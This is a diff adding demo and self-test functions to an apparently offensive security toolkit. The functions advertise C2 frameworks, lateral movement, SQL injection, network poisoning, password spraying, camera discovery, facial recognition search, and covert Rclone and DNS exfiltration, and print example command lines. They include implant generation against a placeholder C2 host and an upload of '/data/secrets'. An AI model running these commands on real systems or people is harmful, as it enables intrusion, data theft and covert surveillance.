+    print("  ✓ Holehe for platform registration checking")
+    print("  ✓ Sherlock for username search (400+ sites)")
+    print("  ✓ Maigret for deep search (3000+ sites)")
+
+
+def demo_facial_recognition():
+    print("\n" + "=" * 70)
+    print("👤 FACIAL RECOGNITION SEARCH")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Face encoding and matching (face_recognition library)")
+    print("   • Search directories for matching faces")
+    print("   • DeepFace integration for age, gender, emotion detection")
+    print("   • Face database management with confidence scoring")
+    print("   • Support for multiple AI models (VGG-Face, Facenet, ArcFace)")
+    print("   • Image comparison and similarity scoring")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.facial_recognition_search --target person.jpg --search-dir /photos --authorized")
+    print("  python -m cerberus_agents.facial_recognition_search --target photo.jpg --analyze --authorized")
+    print("\nReal integrations:")
+    print("  ✓ face_recognition (55k GitHub stars)")
+    print("  ✓ DeepFace for advanced analysis")
+    print("  ✓ Multiple model support")
+
+
+def demo_cctv_discovery():
+    print("\n" + "=" * 70)
+    print("📹 CCTV & IP CAMERA DISCOVERY")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Shodan API integration - Search exposed cameras worldwide")
+    print("   • Local network scanner with manufacturer auto-detection")
+    print("   • ONVIF camera discovery (WS-Discovery protocol)")
+    print("   • RTSP stream discovery and testing")
+    print("   • Google dorking database (14+ queries)")
+    print("   • Support for 10+ camera manufacturers")
+    print("\nExample usage:")
+    print("  export SHODAN_API_KEY='your_key'")
+    print("  python -m cerberus_agents.cctv_camera_discovery --shodan --query 'webcamxp' --country US --authorized")
+    print("  python -m cerberus_agents.cctv_camera_discovery --scan-network 192.168.1.0/24 --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Shodan API for global search")
+    print("  ✓ ONVIF WS-Discovery")
+    print("  ✓ RTSP stream testing")
+
+
+def demo_camera_pentesting():
+    print("\n" + "=" * 70)
+    print("🔒 NETWORK CAMERA PENTESTING")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Default credential testing (18+ combinations)")
+    print("   • Manufacturer-specific credential database (10+ brands)")
+    print("   • RTSP authentication testing")
+    print("   • CVE vulnerability scanning (4+ critical CVEs)")
+    print("   • ONVIF security testing")
+    print("   • SSL/TLS and security header auditing")
+    print("   • Comprehensive security configuration analysis")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.network_camera_pentesting --target 192.168.1.100 --test-auth --scan-vulns --authorized")
+    print("  python -m cerberus_agents.network_camera_pentesting --target 192.168.1.100 --audit --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Hikvision, Dahua, Axis, Foscam CVE database")
+    print("  ✓ ONVIF security testing")
+    print("  ✓ RTSP stream exploitation")
+
+
+def demo_ai_image_intelligence():
+    print("\n" + "=" * 70)
+    print("🤖 AI-POWERED IMAGE INTELLIGENCE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Complete EXIF metadata extraction")
+    print("   • GPS coordinate parsing and Google Maps links")
+    print("   • Google Gemini AI integration for image analysis")
+    print("   • Location identification from visual cues")
+    print("   • OCR and text extraction")
+    print("   • Reverse geocoding (coordinates to address)")
+    print("   • Image forensics and tampering detection")
+    print("   • Perceptual hashing for similarity detection")
+    print("\nExample usage:")
+    print("  export GEMINI_API_KEY='your_key'")
+    print("  python -m cerberus_agents.ai_image_intelligence --image photo.jpg --geolocate --ai-analyze --authorized")
+    print("  python -m cerberus_agents.ai_image_intelligence --image photo.jpg --extract-exif --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Google Gemini AI")
+    print("  ✓ PIL/Pillow for EXIF extraction")
+    print("  ✓ Reverse geocoding with OpenStreetMap")
+
+
+def demo_c2_integration():
+    print("\n" + "=" * 70)
+    print("🎯 ADVANCED C2 FRAMEWORK INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Sliver C2 client integration")
+    print("   • PowerShell Empire API integration")
+    print("   • Mythic C2 GraphQL API")
+    print("   • Metasploit RPC integration")
+    print("   • Implant/payload generation")
+    print("   • Session management")
+    print("   • Command execution automation")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.advanced_c2_framework --framework sliver --action list-sessions --authorized")
+    print("  python -m cerberus_agents.advanced_c2_framework --framework empire --action list-sessions --api-key TOKEN --authorized")
+    print("  python -m cerberus_agents.advanced_c2_framework --framework metasploit --action connect --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Sliver gRPC client")
+    print("  ✓ Empire REST API")
+    print("  ✓ Mythic GraphQL API")
+    print("  ✓ Metasploit RPC (pymetasploit3)")
+
+
+def show_documentation():
+    print("\n" + "=" * 70)
+    print("📚 DOCUMENTATION")
+    print("=" * 70)
+    readme_path = Path("README.md")
+    if readme_path.exists():
+        with readme_path.open() as f:
+            content = f.read()
+            print(content[:3000])
+            if len(content) > 3000:
+                print("\n... (see README.md for full documentation)")
+    else:
+        print("\n⚠️  README.md not found")
+
+
+def run_production_tests():
+    print("\n" + "=" * 70)
+    print("🧪 PRODUCTION INTEGRATION TESTS")
+    print("=" * 70)
+    
+    tests_passed = 0
+    tests_failed = 0
+    
+    print("\n1. Testing production module imports...")
+    try:
+        from cerberus_agents import network_scanner_advanced
+        from cerberus_agents import database_security_scanner
+        from cerberus_agents import api_security_scanner
+        from cerberus_agents import active_directory_attacks
+        from cerberus_agents import cloud_security_scanner
+        from cerberus_agents import wireless_security
+        from cerberus_agents import container_kubernetes_security
+        from cerberus_agents import mobile_app_security
+        from cerberus_agents import post_exploitation_framework
+        from cerberus_agents import social_engineering
+        from cerberus_agents import adversary_emulation
+        from cerberus_agents import detection_scoring
+        print("   ✓ All 12 production modules imported successfully")
+        tests_passed += 1
+    except Exception as e:
+        print(f"   ✗ Import failed: {e}")
+        tests_failed += 1
+    
+    print("\n2. Testing production library availability...")
+    libs = {
+        'nmap': 'Network scanning (nmap)',
+        'httpx': 'HTTP operations',
+        'pymysql': 'MySQL connections',
+        'psycopg2': 'PostgreSQL connections',
+        'pymongo': 'MongoDB connections',
+        'ldap3': 'LDAP/Active Directory',
+        'boto3': 'AWS cloud operations',
+        'scapy': 'Wireless packet capture',
+        'jwt': 'JWT security testing',
+        'bs4': 'Web scraping'
+    }
+    
+    available = 0
+    for lib, desc in libs.items():
+        try:
+            __import__(lib)
+            print(f"   ✓ {desc}: {lib}")
+            available += 1
+        except ImportError:
+            print(f"   ✗ {desc}: {lib} not available")
+    
+    if available == len(libs):
+        print(f"   ✓ All {len(libs)} production libraries available")
+        tests_passed += 1
+    else:
+        print(f"   ⚠️  {available}/{len(libs)} libraries available")
+        tests_failed += 1
+    
+    print("\n" + "=" * 70)
+    print(f"✅ Tests Passed: {tests_passed}")
+    print(f"❌ Tests Failed: {tests_failed}")
+    print("=" * 70)
+    
+    print("\n📝 PRODUCTION READINESS STATUS:")
+    if tests_passed >= 2:
+        print("   ✅ Toolkit is production-ready with real integrations")
+        print("   ✅ Network scanning: nmap integration available")
+        print("   ✅ Database testing: MySQL/PostgreSQL/MongoDB connections")
+        print("   ✅ API testing: Real JWT and HTTP operations")
+        print("   ✅ Active Directory: LDAP enumeration ready")
+        print("   ✅ Cloud security: AWS/boto3 integration")
+        print("   ✅ Wireless: Scapy packet capture available")
+    else:
+        print("   ⚠️  Some production features may be limited")
+        print("   Run: pip install -r requirements.txt")
+
+
+def demo_impacket():
+    print("\n" + "=" * 70)
+    print("🔨 IMPACKET LATERAL MOVEMENT - REAL INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • PSExec lateral movement (REAL Impacket psexec)")
+    print("   • WMIExec remote command execution")
+    print("   • SMBExec authenticated RCE")
+    print("   • DCESync credential dumping")
+    print("   • Kerberos ticket attacks (Golden/Silver)")
+    print("   • Pass-the-Hash and Pass-the-Ticket")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.impacket_lateral_movement --target 192.168.1.10 --username admin --password pass123 --method psexec --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Impacket library for SMB/Kerberos operations")
+    print("  ✓ Real lateral movement capabilities")
+    print("  ✓ Production red team operations")
+
+def demo_sqlmap():
+    print("\n" + "=" * 70)
+    print("💉 SQLMAP SQL INJECTION EXPLOITATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Automated SQL injection detection and exploitation")
+    print("   • Database enumeration (tables, columns, data)")
+    print("   • Multiple database support (MySQL, PostgreSQL, MSSQL, Oracle)")
+    print("   • OS command execution via SQL injection")
+    print("   • File system access and shell upload")
+    print("   • Time-based and error-based blind SQLi")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.sqlmap_exploitation --url 'http://target.com/user?id=1' --authorized")
+    print("\nReal integrations:")
+    print("  ✓ SQLMap-style exploitation engine")
+    print("  ✓ Real database dumping capabilities")
+    print("  ✓ Advanced injection techniques")
+
+def demo_subdomain_enum():
+    print("\n" + "=" * 70)
+    print("🔍 ADVANCED SUBDOMAIN ENUMERATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Certificate Transparency log mining (crt.sh)")
+    print("   • DNS brute force with threading")
+    print("   • DNS zone transfer attempts")
+    print("   • Subdomain takeover detection")
+    print("   • DNS record resolution (A, AAAA, CNAME)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.subdomain_enumeration --domain example.com --methods all --authorized")
+    print("\nReal integrations:")
+    print("  ✓ dnspython for DNS operations")
+    print("  ✓ Certificate Transparency API")
+    print("  ✓ Concurrent subdomain discovery")
+
+def demo_advanced_osint():
+    print("\n" + "=" * 70)
+    print("🕵️  ADVANCED OSINT RECONNAISSANCE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Email harvesting (Google, PGP servers, common patterns)")
+    print("   • Social media profile enumeration")
+    print("   • Technology fingerprinting (CMS, frameworks, servers)")
+    print("   • Comprehensive DNS reconnaissance")
+    print("   • WHOIS data extraction")
+    print("   • Data breach checking (HIBP integration)")
+    print("   • Code repository searching (GitHub, GitLab)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.advanced_osint_recon --target example.com --modules all --authorized")
+    print("\nReal integrations:")
+    print("  ✓ python-whois for domain data")
+    print("  ✓ Real email harvesting")
+    print("  ✓ Technology detection")
+
+def demo_aws_exploitation():
+    print("\n" + "=" * 70)
+    print("☁️  AWS CLOUD EXPLOITATION - REAL BOTO3")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • S3 bucket enumeration and security audit")
+    print("   • Public S3 bucket detection")
+    print("   • Encryption and versioning checks")
+    print("   • EC2 instance enumeration")
+    print("   • Security group audit (overly permissive rules)")
+    print("   • IAM user and access key enumeration")
+    print("   • EBS snapshot exposure checking")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.aws_exploitation --region us-east-1 --modules all --authorized")
+    print("\nReal integrations:")
+    print("  ✓ boto3 for real AWS API operations")
+    print("  ✓ Production cloud security assessment")
+    print("  ✓ Pacu-style cloud enumeration")
+
+def demo_network_poisoning():
+    print("\n" + "=" * 70)
+    print("🎣 NETWORK POISONING - RESPONDER-STYLE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • LLMNR poisoning (UDP 5355)")
+    print("   • NBT-NS poisoning (UDP 137)")
+    print("   • mDNS poisoning (UDP 5353)")
+    print("   • ARP spoofing for MITM")
+    print("   • Rogue SMB server for NTLM hash capture")
+    print("   • Rogue HTTP server for credential harvesting")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.network_poisoning --interface eth0 --protocols all --smb --authorized")
+    print("\nReal integrations:")
+    print("  ✓ scapy for packet manipulation")
+    print("  ✓ Responder-style credential capture")
+    print("  ✓ NTLM hash collection")
+
+def demo_vuln_scanner():
+    print("\n" + "=" * 70)
+    print("🐛 VULNERABILITY SCANNER - CVE DATABASE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • CVE database searching (cve.circl.lu)")
+    print("   • Exploit availability checking (Exploit-DB, GitHub)")
+    print("   • Service version vulnerability scanning")
+    print("   • Nuclei-style template-based scanning")
+    print("   • WordPress security assessment")
+    print("   • CVSS scoring and severity classification")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.vulnerability_scanner --search 'Apache 2.4' --authorized")
+    print("\nReal integrations:")
+    print("  ✓ CVE database API integration")
+    print("  ✓ Real exploit verification")
+    print("  ✓ Nuclei-style vulnerability templates")
+
+def demo_network_pivoting():
+    print("\n" + "=" * 70)
+    print("🔀 NETWORK PIVOTING & TUNNELING")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • SSH dynamic port forwarding (SOCKS proxy)")
+    print("   • SSH local/remote port forwarding")
+    print("   • Chisel HTTP tunneling")
+    print("   • Socat relay configuration")
+    print("   • Metasploit autoroute setup")
+    print("   • Proxychains configuration generation")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.network_pivoting --pivot-host 10.10.10.5 --username admin --tunnel-type dynamic --authorized")
+    print("\nReal integrations:")
+    print("  ✓ paramiko for SSH tunneling")
+    print("  ✓ Production pivoting techniques")
+    print("  ✓ Multi-protocol tunneling support")
+
+def demo_sliver_c2():
+    """Demo Sliver C2 Framework"""
+    print("\n" + "=" * 70)
+    print("🚀 SLIVER C2 FRAMEWORK - NATION-STATE LEVEL")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Go-based cross-platform implants (Windows, macOS, Linux)")
+    print("   • Multiple C2 channels: mTLS, WireGuard, HTTP(S), DNS")
+    print("   • Dynamic code generation per implant")
+    print("   • In-memory execution and process injection")
+    print("   • Metasploit integration for staged payloads")
+    print("   • Per-instance TLS certificates for evasion")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.sliver_c2_framework --check")
+    print("  python -m cerberus_agents.sliver_c2_framework --info")
+    print("  python -m cerberus_agents.sliver_c2_framework --generate --os windows --c2-url https://c2.example.com")
+    print("\n🔗 Real Integration: BishopFox Sliver C2 framework")
+
+def demo_mythic_c2():
+    """Demo Mythic C2 Framework"""
+    print("\n" + "=" * 70)
+    print("🎭 MYTHIC C2 FRAMEWORK - OPERATOR ANALYTICS")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Modular agent architecture (Apollo .NET, Apfell JS, Poseidon Python)")
+    print("   • Real-time operator analytics and tracking")
+    print("   • Multiple C2 protocols: HTTP, HTTPS, TCP, DNS, SMB, WebSocket")
+    print("   • Docker-based deployment for easy setup")
+    print("   • Web UI with comprehensive logging")
+    print("   • Integrated Mimikatz for credential dumping")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.mythic_c2_framework --check")
+    print("  python -m cerberus_agents.mythic_c2_framework --info")
+    print("\n🔗 Real Integration: Mythic C2 Docker-based framework")
+
+def demo_pacu():
+    """Demo Pacu AWS Exploitation"""
+    print("\n" + "=" * 70)
+    print("☁️  PACU AWS EXPLOITATION FRAMEWORK")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • 21 IAM privilege escalation methods")
+    print("   • S3 bucket enumeration and exfiltration")
+    print("   • EC2 instance enumeration and user data extraction")
+    print("   • Lambda function backdoor creation")
+    print("   • AWS Secrets Manager dumping")
+    print("   • CloudTrail log analysis and manipulation")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.pacu_aws_exploitation --check")
+    print("  python -m cerberus_agents.pacu_aws_exploitation --list-modules")
+    print("  python -m cerberus_agents.pacu_aws_exploitation --enum-iam")
+    print("  python -m cerberus_agents.pacu_aws_exploitation --privesc-scan")
+    print("\n🔗 Real Integration: Rhino Security Labs Pacu framework")
+
+def demo_prowler():
+    """Demo Prowler Cloud Compliance"""
+    print("\n" + "=" * 70)
+    print("📋 PROWLER CLOUD COMPLIANCE SCANNER")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • CIS Benchmarks compliance for AWS, Azure, GCP")
+    print("   • PCI-DSS, HIPAA, GDPR, ISO 27001, SOC 2 frameworks")
+    print("   • 400+ security checks across cloud services")
+    print("   • JSON, HTML, CSV output formats")
+    print("   • Multi-account scanning support")
+    print("   • Integration with AWS Security Hub")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.prowler_cloud_compliance --check")
+    print("  python -m cerberus_agents.prowler_cloud_compliance --provider aws --quick")
+    print("  python -m cerberus_agents.prowler_cloud_compliance --provider aws --compliance cis")
+    print("\n🔗 Real Integration: Prowler multi-cloud security scanner")
+
+def demo_spiderfoot():
+    """Demo SpiderFoot OSINT"""
+    print("\n" + "=" * 70)
+    print("🕷️  SPIDERFOOT OSINT AUTOMATION PLATFORM")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • 200+ OSINT modules for automated reconnaissance")
+    print("   • Dark web monitoring and data breach checking")
+    print("   • Domain/IP/email/phone number intelligence")
+    print("   • Social media and company information gathering")
+    print("   • Web-based UI with REST API")
+    print("   • Real-time scanning and correlation")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.spiderfoot_osint --check")
+    print("  python -m cerberus_agents.spiderfoot_osint --scan example.com")
+    print("  python -m cerberus_agents.spiderfoot_osint --list-modules")
+    print("\n🔗 Real Integration: SpiderFoot OSINT framework with API")
+
+def demo_empire():
+    """Demo PowerShell Empire"""
+    print("\n" + "=" * 70)
+    print("👑 POWERSHELL EMPIRE C2 FRAMEWORK")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Multi-language agents: PowerShell, Python, C#")
+    print("   • 400+ post-exploitation modules")
+    print("   • Multiple listener types: HTTP, HTTPS, OneDrive, Dropbox")
+    print("   • Encrypted communications with malleable C2 profiles")
+    print("   • Plugin architecture for extensibility")
+    print("   • AMSI bypass capabilities built-in")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.empire_c2_integration --check")
+    print("  python -m cerberus_agents.empire_c2_integration --info")
+    print("  python -m cerberus_agents.empire_c2_integration --listeners")
+    print("\n🔗 Real Integration: BC Security PowerShell Empire")
+
+def demo_zap():
+    """Demo OWASP ZAP Scanner"""
+    print("\n" + "=" * 70)
+    print("🔍 OWASP ZAP WEB APPLICATION SCANNER")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Industry-standard web security scanner")
+    print("   • Active and passive vulnerability scanning")
+    print("   • OpenAPI/Swagger API testing support")
+    print("   • Automated spider/crawler for discovery")
+    print("   • Intercepting proxy for manual testing")
+    print("   • Docker container for CI/CD integration")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.owasp_zap_scanner --check")
+    print("  python -m cerberus_agents.owasp_zap_scanner --target https://example.com --baseline")
+    print("  python -m cerberus_agents.owasp_zap_scanner --target https://example.com --active-scan")
+    print("\n🔗 Real Integration: OWASP ZAP REST API")
+
+def demo_reconftw():
+    """Demo reconFTW Automation"""
+    print("\n" + "=" * 70)
+    print("🎯 RECONFTW AUTOMATED RECONNAISSANCE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Complete automated recon workflow")
+    print("   • Subdomain enumeration (Amass, Subfinder, Assetfinder)")
+    print("   • Vulnerability scanning with Nuclei templates")
+    print("   • Web screenshot automation with Gowitness")
+    print("   • JavaScript analysis and parameter discovery")
+    print("   • HTML reports with comprehensive findings")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.reconftw_automation --check")
+    print("  python -m cerberus_agents.reconftw_automation --target example.com --mode full")
+    print("  python -m cerberus_agents.reconftw_automation --target example.com --mode passive")
+    print("\n🔗 Real Integration: six2dez reconFTW framework")
+
+def demo_rclone():
+    """Demo Rclone Exfiltration"""
+    print("\n" + "=" * 70)
+    print("📤 RCLONE DATA EXFILTRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • 40+ cloud provider support for covert exfiltration")
+    print("   • Bandwidth throttling for stealth (avoid detection)")
+    print("   • Encrypted file transfers")
+    print("   • Resume support for interrupted transfers")
+    print("   • Mount cloud storage as local filesystem")
+    print("   • Scriptable automation for continuous exfiltration")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.rclone_exfiltration --check")
+    print("  python -m cerberus_agents.rclone_exfiltration --list-remotes")
+    print("  python -m cerberus_agents.rclone_exfiltration --upload /data/secrets --remote gdrive --remote-path /exfil")
+    print("\n🔗 Real Integration: Rclone cloud sync tool")
+
+def demo_dns_tunneling():
+    """Demo DNS Tunneling"""
+    print("\n" + "=" * 70)
+    print("🌐 DNS TUNNELING C2 (DNSCAT2/IODINE)")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Bypass restrictive firewalls via DNS queries")
+    print("   • DNScat2: Encrypted C2 channel over DNS")
+    print("   • Iodine: Full IP-over-DNS tunnel")
+    print("   • Covert communications when HTTP/HTTPS blocked")
+    print("   • Data exfiltration through DNS queries")
+    print("   • Supports multiple simultaneous sessions")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.dns_tunneling_c2 --check")
+    print("  python -m cerberus_agents.dns_tunneling_c2 --tool dnscat2 --server --domain tunnel.local")
+    print("  python -m cerberus_agents.dns_tunneling_c2 --tool iodine --server --domain tunnel.local")
+    print("\n🔗 Real Integration: DNScat2 and Iodine DNS tunneling tools")
+
+def demo_ghostpack():
+    """Demo GhostPack Suite"""
+    print("\n" + "=" * 70)
+    print("👻 GHOSTPACK SUITE (RUBEUS/SEATBELT/CERTIFY)")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Rubeus: Kerberos attacks (Kerberoasting, AS-REP, Golden/Silver tickets)")
+    print("   • Seatbelt: Host enumeration for situational awareness")
+    print("   • Certify: AD Certificate Services exploitation (ESC1-ESC8)")
+    print("   • SharpDPAPI: DPAPI credential extraction (Chrome, RDP, Vault)")
+    print("   • SharpUp: Privilege escalation enumeration")
+    print("   • All tools written in C# for in-memory execution")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.ghostpack_suite --info")
+    print("  python -m cerberus_agents.ghostpack_suite --list-tools")
+    print("  python -m cerberus_agents.ghostpack_suite --tool Rubeus")
+    print("\n🔗 Real Integration: SpecterOps GhostPack offensive toolset")
+
+def demo_poshc2():
+    """Demo PoshC2 Framework"""
+    print("\n" + "=" * 70)
+    print("🐍 POSHC2 FRAMEWORK - PYTHON3 C2")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Python 3-based C2 server")
+    print("   • PowerShell, C#, and Python implants")
+    print("   • Proxy-aware communications")
+    print("   • Auto-generated Apache rewrite rules")
+    print("   • Built-in AMSI bypass capabilities")
+    print("   • Shellcode ETW patching for evasion")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.poshc2_framework --check")
+    print("  python -m cerberus_agents.poshc2_framework --info")
+    print("\n🔗 Real Integration: Nettitude PoshC2 framework")
+
+def demo_rustscan():
+    """Demo RustScan Integration"""
+    print("\n" + "=" * 70)
+    print("🚀 RUSTSCAN INTEGRATION - ULTRA-FAST PORT SCANNER")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Scan all 65,535 ports in ~3 seconds")
+    print("   • 100x faster than traditional nmap")
+    print("   • Written in Rust for maximum performance")
+    print("   • Automatic nmap integration for service detection")
+    print("   • SYN stealth scans, UDP scans, comprehensive scans")
+    print("   • Batch size optimization (default: 4500)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.rustscan_integration --target 192.168.1.1 --authorized")
+    print("  python -m cerberus_agents.rustscan_integration --target example.com --stealth --authorized")
+    print("  python -m cerberus_agents.rustscan_integration --target 192.168.1.0/24 --comprehensive --authorized")
+    print("\n🔗 Real Integration: RustScan ultra-fast port scanner")
+
+def demo_ffuf():
+    """Demo Ffuf Integration"""
+    print("\n" + "=" * 70)
+    print("⚡ FFUF INTEGRATION - FAST WEB FUZZER")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Fuzz Faster U Fool - Fast web fuzzer (Go)")
+    print("   • Directory/file fuzzing with extensions")
+    print("   • VHost discovery and subdomain enumeration")
+    print("   • GET/POST parameter fuzzing")
+    print("   • HTTP header fuzzing")
+    print("   • API endpoint discovery")
+    print("   • Flexible FUZZ keyword placement")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.ffuf_integration --url https://target.com/FUZZ --wordlist dirs.txt --authorized")
+    print("  python -m cerberus_agents.ffuf_integration --url https://example.com --vhost --domain example.com --wordlist subdomains.txt --authorized")
+    print("  python -m cerberus_agents.ffuf_integration --subdomain --domain example.com --wordlist subdomains.txt --authorized")
+    print("\n🔗 Real Integration: Ffuf web fuzzer")
+
+def demo_feroxbuster():
+    """Demo Feroxbuster Integration"""
+    print("\n" + "=" * 70)
+    print("🔍 FEROXBUSTER INTEGRATION - RECURSIVE CONTENT DISCOVERY")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Fast recursive content discovery (Rust)")
+    print("   • Automatic wildcard filtering")
+    print("   • SOCKS proxy support for pivoting")
+    print("   • Authenticated scanning with custom headers/cookies")
+    print("   • Backup file discovery (.bak, .old, .tmp)")
+    print("   • Auto-tune thread count")
+    print("   • Depth-based recursion control")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.feroxbuster_integration --url https://target.com --wordlist dirs.txt --authorized")
+    print("  python -m cerberus_agents.feroxbuster_integration --url http://internal.local --wordlist dirs.txt --socks 127.0.0.1:1080 --authorized")
+    print("  python -m cerberus_agents.feroxbuster_integration --url https://example.com --wordlist files.txt --backup-scan --authorized")
+    print("\n🔗 Real Integration: Feroxbuster recursive scanner")
+
+def demo_ligolo():
+    """Demo Ligolo-ng Integration"""
+    print("\n" + "=" * 70)
+    print("🌐 LIGOLO-NG INTEGRATION - ADVANCED TUNNELING & PIVOTING")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Modern tunneling using TUN interface (VPN-like)")
+    print("   • 100+ Mbits/sec throughput")
+    print("   • Full protocol support (TCP, UDP, ICMP, DNS)")
+    print("   • No proxychains required - direct tool execution")
+    print("   • nmap SYN scans through tunnel")
+    print("   • Easy session switching for multi-pivot")
+    print("   • Cross-platform (Windows, macOS, Linux)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.ligolo_ng_integration --setup-tun --authorized")
+    print("  python -m cerberus_agents.ligolo_ng_integration --proxy --authorized")
+    print("  python -m cerberus_agents.ligolo_ng_integration --agent --connect 192.168.1.100:11601 --authorized")
+    print("  python -m cerberus_agents.ligolo_ng_integration --add-route 10.10.10.0/24 --authorized")
+    print("\n🔗 Real Integration: Ligolo-ng TUN-based pivoting")
+
+def demo_kerbrute():
+    """Demo Kerbrute Integration"""
+    print("\n" + "=" * 70)
+    print("🎫 KERBRUTE INTEGRATION - KERBEROS ENUMERATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Kerberos pre-auth bruteforcing")
+    print("   • User enumeration without account lockouts!")
+    print("   • Password spraying with delay control")
+    print("   • Doesn't trigger Event ID 4625 (failed logon)")
+    print("   • Does trigger Event ID 4768 (TGT request)")
+    print("   • Fast Kerberos-based authentication")
+    print("   • Safe username discovery (no bad password count)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.kerbrute_integration --domain corp.local --dc 192.168.1.10 --userenum users.txt --authorized")
+    print("  python -m cerberus_agents.kerbrute_integration --domain corp.local --dc 192.168.1.10 --passwordspray users.txt --password Welcome2025 --delay 1 --authorized")
+    print("\n🔗 Real Integration: Kerbrute Kerberos enumeration")
+
+def demo_enum4linux_ng():
+    """Demo enum4linux-ng Integration"""
+    print("\n" + "=" * 70)
+    print("📁 ENUM4LINUX-NG INTEGRATION - SMB/LDAP ENUMERATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Modern Python rewrite of enum4linux")
+    print("   • SMB/LDAP enumeration for Windows/Samba")
+    print("   • RID cycling for username discovery")
+    print("   • Share enumeration and permission mapping")
+    print("   • LDAP enumeration for domain controllers")
+    print("   • Password policy enumeration")
+    print("   • JSON/YAML output for automation")
+    print("   • Smart enumeration (auto-detects available services)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.enum4linux_ng_integration --target 192.168.1.10 --full --authorized")
+    print("  python -m cerberus_agents.enum4linux_ng_integration --target 192.168.1.10 --full -u administrator -p Password123 --json results.json --authorized")
+    print("  python -m cerberus_agents.enum4linux_ng_integration --target dc.corp.local --ldap -u user -p pass --authorized")
+    print("\n🔗 Real Integration: enum4linux-ng modern enumeration")
+
+def demo_cloudfox():
+    """Demo CloudFox AWS Integration"""
+    print("\n" + "=" * 70)
+    print("☁️  CLOUDFOX AWS INTEGRATION - ATTACK PATH ANALYSIS")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • AWS attack path enumeration and analysis")
+    print("   • IAM principal and permission enumeration")
+    print("   • EC2 instance and endpoint discovery")
+    print("   • Secrets Manager and Parameter Store search")
+    print("   • S3 bucket and EFS filesystem enumeration")
+    print("   • RDS and DynamoDB database discovery")
+    print("   • IAM role trust relationship analysis")
+    print("   • Lambda function enumeration")
+    print("   • ECR repository scanning")
+    print("   • PMapper privilege escalation analysis")
+    print("   • Automatic HTML report generation")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.cloudfox_aws_integration --all --profile default --authorized")
+    print("  python -m cerberus_agents.cloudfox_aws_integration --principals --authorized")
+    print("  python -m cerberus_agents.cloudfox_aws_integration --secrets --authorized")
